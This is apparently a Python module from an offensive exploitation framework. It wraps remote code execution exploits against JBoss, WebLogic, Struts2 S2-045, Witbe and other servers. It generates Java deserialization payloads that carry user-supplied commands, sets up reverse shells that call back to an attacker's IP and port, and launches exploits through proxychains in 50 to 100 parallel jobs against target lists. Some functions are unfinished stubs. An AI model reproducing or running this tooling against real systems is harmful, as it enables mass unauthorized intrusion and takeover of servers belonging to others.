#!/usr/bin/python3

import os
from . import colors
from . import console


# generate payload for exserial rce exploits
def java_payload(ostype, cmd):
    '''
    doc
    '''
    if ostype == 'w':
        os.system(
            "java -jar exploits/exserial/exserial.jar CommandExec Win {} > /tmp/win.bin".format(cmd))
    else:
        os.system(
            "java -jar exploits/exserial/exserial.jar CommandExec Linux {} > /tmp/lin.bin".format(cmd))


def jboss():
    '''
    doc
    '''
    print(colors.BLUE + '\n[*] Welcome to JBoss RCE' + colors.END)

    # port = console.input_check("[?] Port of the target server: ",
    # check_type=int)
    ostype = console.input_check(
        "[?] Windows or Linux? [w/l]", choices=['w', 'l'])
    cmd = console.input_check(
        "[?] Command to execute on the target: ",
        allow_blank=False)

    java_payload(ostype, cmd)
    # TODO not finished


def jenkins():
    print(colors.BLUE + '\n[*] Welcome to Jenkins RCE' + colors.END)
    # TODO not finished


def websphere():
    print(colors.BLUE + '\n[*] Welcome to Websphere RCE' + colors.END)
    # TODO not finished


def weblogic():
    '''
    with reverse shell
    '''
    print(colors.BLUE +
          '\n[*] Welcome to Weblogic getshell exploit' +
          colors.END)

    server_port = console.input_check(
        "[?] What's the port of Welogic server? ",
        check_type=int)
    os_type = console.input_check(
        '[?] Windows or Linux? [w/l] ', choices=['w', 'l'])
    if console.input_check('[?] Do you need a reverse shell? [y/n] ', choices=['y', 'n']) == 'y':
        shell_server = console.input_check(
            '[?] What\'s the IP of shell receiver? ',
            allow_blank=False)
        port = console.input_check(
            '[?] What\'s the port of shell receiver? ',
            check_type=int)
        if os_type.lower() == 'w':
            custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os win'.format(
                shell_server, port, server_port).split()
        elif os_type.lower() == 'l':
            custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os linux'.format(
                shell_server, port, server_port).split()
        else:
            console.print_error('[-] Invalid input')
            return
    else:
        cmd = str(
            input(colors.BLUE +
                  '[?] What command do you want to execute on the target? ' +
                  colors.END)).strip()
        if os_type.lower() == 'w':
            custom_args = '-P {} --silent -T exploit -c {} -os win'.format(
                server_port, cmd)
        elif os_type.lower() == 'l':
            custom_args = '-P {} --silent -T exploit -c {} -os linux'.format(
                server_port, cmd)
        else:
            return

    # start scanner
    exploit = 'weblogic.py'
    work_path = '/weblogic/'
    exec_path = exploit
    jobs = 100
    # waitTime = 25  # deprecated
    scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
    return scanner_args


# currently not available
def redis():
    print(colors.BLUE + '\n[*] Welcome to Redis exploit' + colors.END)


def s2_045():
    print(colors.BLUE + '\n[*] Welcome to S2-045' + colors.END)
    port = console.input_check(
        '[?] What\'s the port of your target server? ',
        check_type=int)

    # args list
    exploit = 's2_045_cmd.py'
    work_path = '/structs2/'
    exec_path = exploit
    custom_args = str('-p ' + port).split()
    jobs = 100

    print(colors.BLUE +
          '[*] Your exploit will be executed like\n' +
          colors.END,
          'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(exec_path),
          ' '.join(custom_args))
    # start scanner
    scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
    return scanner_args


def witbe():
    print(colors.BLUE + '\n[*] Welcome to Witbe RCE' + colors.END)

    # shell server config
    rhost = console.input_check('[?] IP of your shell server: ')
    rport = console.input_check('[?] and Port? ', check_type=int)

    # exploit config
    exploit = 'witbe.py'
    work_path = '/witbe/'
    exec_path = exploit
    custom_args = str('-l ' + rhost + ' -p ' + rport).split()
    jobs = 50
    print(colors.BLUE +
          '[*] Your exploit will be executed like\n' +
          colors.END,
          'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(exec_path),
          ' '.join(custom_args))
    # start scanner
    scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
    return scanner_args
